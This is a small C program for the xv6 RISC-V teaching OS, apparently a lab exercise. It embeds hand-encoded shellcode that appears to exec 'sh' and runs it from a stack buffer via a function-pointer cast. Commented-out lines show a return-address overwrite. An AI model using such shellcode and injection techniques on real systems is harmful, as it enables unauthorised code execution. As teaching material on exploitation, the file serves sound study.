#include "kernel/types.h"
#include "user/user.h"

char *shellcode =
    "\x6f\x00\xc0\x01"
    "\x13\x85\x00\x00"
    "\x23\xb4\xa0\x00"
    "\x23\xb8\x00\x00"
    "\x93\x85\x80\x00"
    "\x9d\x48"
    "\x73\x00\x00\x00"
    "\x82\x80"
//     "\x01\x45"
//     "\x89\x48"
//     "\x73\x00\x00\x00"
//     "\x82\x80"
    "\x97\x00\x00\x00"
    "\xe7\x80\x80\xfe"
    "\x73\x68"
    ;

int
main()
{
//     int *ret;
// 
//     ret = (int *)&ret + 2;
//     (*ret) = (int)shellcode;
    char payload[50];

    memcpy(payload, shellcode, 50);

    (*(void(*)()) payload) ();
    
    return 0;
}
